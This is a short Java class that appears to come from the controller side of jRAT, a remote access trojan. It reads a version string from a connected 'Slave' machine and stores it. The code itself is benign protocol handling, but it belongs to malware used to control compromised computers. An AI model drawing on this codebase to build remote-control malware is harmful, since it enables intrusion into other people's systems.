package jrat.controller.packets.incoming;

import jrat.controller.Slave;


public class Packet6InitVersion implements IncomingPacket {

	public void read(Slave slave) throws Exception {
		String version = slave.readLine();
		slave.setVersion(version);
	}

}
